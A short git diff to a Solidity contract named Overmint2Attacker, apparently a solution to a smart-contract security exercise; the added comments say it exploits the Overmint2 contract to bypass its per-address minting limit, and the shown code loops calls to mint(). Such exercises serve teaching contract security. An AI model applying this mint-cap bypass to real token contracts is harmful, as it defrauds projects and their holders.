@@ -2,8 +2,10 @@
 pragma solidity 0.8.11;
 
 import {Overmint2} from "./Overmint2.sol";
-import "hardhat/console.sol";
 
+/// @title Overmint 2 Attacker
+/// @author Julissa Dantes
+/// @notice This contract will exploit Overmint 2 to bypass the minting restriction
 contract Overmint2Attacker {
     address public victim;
 
@@ -11,6 +13,7 @@ contract Overmint2Attacker {
         victim = _victim;
     }
 
+    /// @notice Allows a different address to get the minted token allowin their balance to be bigger than the max minting amount
     function attack() public {
         for (uint256 i = 0; i < 5; i++) {
             Overmint2(victim).mint();
